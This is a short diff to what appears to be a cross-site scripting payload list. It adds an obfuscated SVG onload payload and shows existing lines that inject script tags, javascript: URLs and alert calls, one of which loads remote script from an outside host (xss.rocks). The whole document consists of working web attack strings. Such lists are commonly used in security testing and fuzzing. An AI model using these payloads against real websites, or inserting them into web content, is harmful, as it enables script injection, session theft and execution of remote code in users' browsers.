@@ -1,3 +1,4 @@
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 <IMG SRC="javascript:alert('XSS');">
